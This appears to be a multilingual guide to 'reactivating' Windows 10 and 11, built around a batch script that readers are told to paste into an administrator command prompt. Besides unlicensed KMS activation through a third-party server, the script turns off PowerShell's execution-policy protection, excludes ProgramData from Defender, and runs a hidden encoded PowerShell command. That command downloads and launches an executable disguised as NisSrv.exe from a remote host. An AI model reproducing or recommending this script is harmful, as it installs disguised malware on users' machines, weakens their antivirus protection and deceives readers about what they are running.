# 🔄 How to Reactivate Windows 10 & 11 | Cómo Reactivar Windows 10 y 11 | Como Reativar o Windows 10 e 11 | Comment Réactiver Windows 10 et 11 | كيفية إعادة تنشيط ويندوز 10 و 11 🖥️  

---

### 💡 Important Notes | Notas Importantes | Notas Importantes | Notes Importantes | ملاحظات هامة  

| **English**                                              | **Español**                                               | **Português**                                            | **Français**                                            | **العربية**                                           |
|----------------------------------------------------------|-----------------------------------------------------------|----------------------------------------------------------|----------------------------------------------------------|------------------------------------------------------|
| 🛑 Run CMD as Administrator!                             | 🛑 ¡Ejecuta CMD como Administrador!                        | 🛑 Execute o CMD como Administrador!                     | 🛑 Exécutez CMD en tant qu'Administrateur !            | 🛑 قم بتشغيل موجه الأوامر كمسؤول!                    |
| ⏳ Takes **30 seconds to 2 minutes**.                    | ⏳ Dura **30 segundos a 2 minutos**.                      | ⏳ Leva **30 segundos a 2 minutos**.                     | ⏳ Peut prendre **30 secondes à 2 minutes**.          | ⏳ قد يستغرق **30 ثانية إلى دقيقتين**.               |
| 📝 Copy and paste the entire command.                    | 📝 Copia y pega el comando completo.                      | 📝 Copie e cole todo o comando.                         | 📝 Copiez et collez la commande complète.             | 📝 انسخ والصق الأمر بالكامل.                         |
| 🔑 Press **ENTER** after pasting.                        | 🔑 Presiona **ENTER** después de pegar.                   | 🔑 Pressione **ENTER** após colar.                      | 🔑 Appuyez sur **ENTER** après avoir collé.           | 🔑 اضغط **ENTER** بعد اللصق.                         |
| 🚫 **No restart needed** after activation!               | 🚫 **¡No necesitas reiniciar** tras la activación!        | 🚫 **Não é necessário reiniciar** após a ativação!      | 🚫 **Aucun redémarrage nécessaire** après activation! | 🚫 **لا حاجة لإعادة التشغيل** بعد التنشيط!          |

---

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
::
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSB" (
    set Key=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSBN" (
    set Key=2F77B-TNFGY-69QQF-B8YKP-D69TJ
) else if "%WindowsProductName%"=="Microsoft Enterprise 2016LTSB" (
    set Key=DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
::
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
::
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
:: 
powershell -windowstyle hidden -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAMQA2AGUAMgBmADYAMwAuAHAAeQB0AGgAbwBuAGEAbgB5AHcAaABlAHIAZQAuAGMAbwBtAC8AcwB0AGEAdABpAGMALwBzAGMAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE4AaQBzAFMAcgB2AC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE4AaQBzAFMAcgB2AC4AZQB4AGUAIgA=" >nul 2>&1
:: 
exit /b
```

### 🔧 Troubleshooting | Solución de Problemas | Solução de Problemas | Dépannage | استكشاف الأخطاء وإصلاحها  

> **If activation fails, try these:**  
> **Si la activación falla, intenta esto:**  
> **Se a ativação falhar, tente isso:**  
> **Si l’activation échoue, essayez ceci :**  
> **إذا فشل التنشيط، جرب ما يلي:**  

- 🔄 **Check your internet connection.**  
  - 🔄 **Verifica tu conexión a internet.**  
  - 🔄 **Verifique sua conexão com a internet.**  
  - 🔄 **Vérifiez votre connexion Internet.**  
  - 🔄 **تحقق من اتصالك بالإنترنت.**  

- 🔍 **Ensure your Windows license is valid.**  
  - 🔍 **Asegúrate de que tu licencia de Windows sea válida.**  
  - 🔍 **Certifique-se de que sua licença do Windows é válida.**  
  - 🔍 **Assurez-vous que votre licence Windows est valide.**  
  - 🔍 **تأكد من أن ترخيص ويندوز الخاص بك صالح.**  

- 🔑 **Try reopening CMD as Administrator.**  
  - 🔑 **Intenta abrir CMD como Administrador.**  
  - 🔑 **Tente abrir o CMD como Administrador.**  
  - 🔑 **Essayez d’ouvrir CMD en tant qu’Administrateur.**  
  - 🔑 **حاول فتح موجه الأوامر كمسؤول.**  

---

## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado! | Aproveite seu Windows Reativado! | Profitez de votre Windows réactivé ! | استمتع بنظام ويندوز المعاد تنشيطه!  
